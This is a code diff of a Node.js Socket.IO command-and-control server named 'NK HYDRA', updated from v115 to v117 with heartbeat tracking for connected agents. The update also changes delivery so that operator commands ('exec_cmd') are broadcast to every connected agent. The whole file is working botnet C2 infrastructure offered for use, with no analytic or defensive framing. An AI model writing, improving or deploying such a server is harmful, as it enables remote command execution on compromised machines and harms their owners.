@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v115.0 [REACTOR CORE]
+// NK HYDRA v117.0 [BROADCAST + HEARTBEAT]
 
 const express = require('express');
 const http = require('http');
@@ -9,25 +9,21 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v115.0 [REACTOR CORE]'); });
+app.get('/', (req, res) => { res.send('HYDRA C2 v117.0 [ACTIVE]'); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    // v115: Configured for unstable networks
-    pingInterval: 25000, 
-    pingTimeout: 120000, 
+    pingInterval: 10000, 
+    pingTimeout: 50000,
     transports: ['polling', 'websocket']
 });
 
 let agents = []; 
 
 io.on('connection', (socket) => {
-    // Debug log for connection
-    // console.log(`[+] New Connection: ${socket.id} via ${socket.conn.transport.name}`);
-
+    
     socket.on('identify', (data) => {
-        // UI does NOT get added to agents list
         if (data.type === 'ui') {
             socket.join('ui_room');
             socket.emit('agents_list', agents);
@@ -51,16 +47,17 @@ io.on('connection', (socket) => {
         }
         
         io.to('ui_room').emit('agents_list', agents);
-        io.to('ui_room').emit('agent_event', {
-            type: 'SYSTEM',
-            agentId: 'CORE',
-            payload: `NEW NODE LINKED: ${data.id}`
-        });
     });
-    
-    // v115: Keepalive handler
-    socket.on('ping_keepalive', (data) => {
-        // Just keeps the connection hot
+
+    // KEEP ALIVE HANDLER
+    socket.on('heartbeat', (data) => {
+        const agent = agents.find(a => a.id === data.id);
+        if (agent) {
+            agent.lastSeen = Date.now();
+            agent.status = 'Online';
+            // Only emit list update if status changed effectively
+            // io.to('ui_room').emit('agents_list', agents); 
+        }
     });
 
     socket.on('exec_cmd', (data) => {
@@ -69,21 +66,17 @@ io.on('connection', (socket) => {
         
         io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
 
-        if (targetId === 'all') {
-            io.emit('exec_cmd', { cmd });
-        } else {
-            const target = agents.find(a => a.id === targetId);
-            if (target) {
-                io.to(target.socketId).emit('exec_cmd', { cmd });
-            }
-        }
+        // v117: BROADCAST FALLBACK
+        // If target is 'all' OR we want to guarantee delivery, we broadcast.
+        io.emit('exec_cmd', { cmd }); 
     });
     
     socket.on('agent_event', (data) => {
         io.to('ui_room').emit('agent_event', data);
     });
 
-    socket.on('disconnect', () => {
+    socket.on('disconnect', (reason) => {
+        console.log(`[!] Disconnect: ${socket.id} (${reason})`);
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
             agent.status = 'Offline'; 
@@ -93,5 +86,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v115 LISTENING ON ${PORT}`));
-
+server.listen(PORT, () => console.log(`HYDRA v117 LISTENING ON ${PORT}`));
